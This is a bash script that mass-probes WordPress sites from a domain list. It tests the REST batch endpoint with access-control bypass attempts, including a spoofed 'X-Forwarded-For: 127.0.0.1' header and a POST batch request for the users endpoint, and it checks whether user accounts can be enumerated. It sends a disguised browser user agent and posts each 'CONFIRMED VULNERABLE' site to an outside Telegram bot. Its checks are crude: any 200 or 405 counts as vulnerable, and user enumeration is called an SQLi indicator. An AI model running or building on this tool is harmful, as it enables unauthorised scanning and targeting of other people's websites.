#!/usr/bin/env bash
# verify-vuln.sh — verify LIKELY_VULNERABLE targets
# Probes batch endpoint with multiple bypass techniques

set -u

UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
RESULTS_DIR="$(dirname "$0")/results"
mkdir -p "$RESULTS_DIR"

TG_TOKEN="${TG_TOKEN:-}"
TG_CHAT_ID="${TG_CHAT_ID:-}"

tg_send() {
  [[ -z "$TG_TOKEN" || -z "$TG_CHAT_ID" ]] && return
  for chat_id in $TG_CHAT_ID; do
    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
      -d chat_id="$chat_id" \
      -d text="$1" \
      -d parse_mode="HTML" > /dev/null 2>&1
  done
}

verify_target() {
  local target="${1%/}"
  [[ "$target" =~ ^https?:// ]] || target="https://$target"

  echo "━━━ $target ━━━"

  local vuln=0

  # Test 1: batch endpoint (pretty permalink)
  local code1
  code1=$(curl -sSL --max-time 15 -A "$UA" -o /dev/null -w "%{http_code}" \
    "$target/wp-json/batch/v1" 2>/dev/null) || code1="000"
  echo "  pretty-permalink:  HTTP $code1"
  [[ "$code1" == "200" || "$code1" == "405" ]] && vuln=1

  # Test 2: batch endpoint (query string)
  local code2
  code2=$(curl -sSL --max-time 15 -A "$UA" -o /dev/null -w "%{http_code}" \
    "$target/?rest_route=/batch/v1" 2>/dev/null) || code2="000"
  echo "  query-string:     HTTP $code2"
  [[ "$code2" == "200" || "$code2" == "405" ]] && vuln=1

  # Test 3: batch endpoint with X-Forwarded-For
  local code3
  code3=$(curl -sSL --max-time 15 -A "$UA" -H "X-Forwarded-For: 127.0.0.1" \
    -o /dev/null -w "%{http_code}" \
    "$target/wp-json/batch/v1" 2>/dev/null) || code3="000"
  echo "  X-Forwarded-For:  HTTP $code3"
  [[ "$code3" == "200" || "$code3" == "405" ]] && vuln=1

  # Test 4: batch endpoint with different methods
  local code4
  code4=$(curl -sSL --max-time 15 -A "$UA" -X POST \
    -H "Content-Type: application/json" \
    -d '{"requests":[{"path":"/wp-json/wp/v2/users"}]}' \
    -o /dev/null -w "%{http_code}" \
    "$target/wp-json/batch/v1" 2>/dev/null) || code4="000"
  echo "  POST batch:       HTTP $code4"
  [[ "$code4" == "200" || "$code4" == "405" ]] && vuln=1

  # Test 5: REST API users endpoint (SQLi indicator)
  local users_code users_body
  users_body=$(curl -sSL --max-time 15 -A "$UA" \
    "$target/wp-json/wp/v2/users" 2>/dev/null)
  users_code=$?
  if echo "$users_body" | grep -q '"id"'; then
    echo "  REST users:       ACCESSIBLE (users enumerable)"
    vuln=1
  else
    echo "  REST users:       blocked or empty"
  fi

  # Test 6: wp-login.php (confirms WordPress)
  local login_code
  login_code=$(curl -sSL --max-time 15 -A "$UA" -o /dev/null -w "%{http_code}" \
    "$target/wp-login.php" 2>/dev/null) || login_code="000"
  echo "  wp-login.php:     HTTP $login_code"

  # Verdict
  if [[ $vuln -eq 1 ]]; then
    echo "  → CONFIRMED VULNERABLE"
    tg_send "🔴 <b>CONFIRMED VULNERABLE</b>\n<code>$target</code>\npretty=$code1 query=$code2 xff=$code3 post=$code4"
  else
    echo "  → NOT CONFIRMED (WAF may be blocking)"
  fi
  echo ""
}

# main
if [[ $# -eq 0 ]]; then
  echo "Usage: $0 <domain> [domain2] [domain3] ..."
  echo "       $0 -f domains.txt"
  exit 1
fi

if [[ "$1" == "-f" ]]; then
  while IFS= read -r line || [[ -n "$line" ]]; do
    line="${line%%#*}"
    line="${line#"${line%%[![:space:]]*}"}"
    line="${line%"${line##*[![:space:]]}"}"
    [[ -z "$line" ]] && continue
    verify_target "$line"
  done < "$2"
else
  for domain in "$@"; do
    verify_target "$domain"
  done
fi
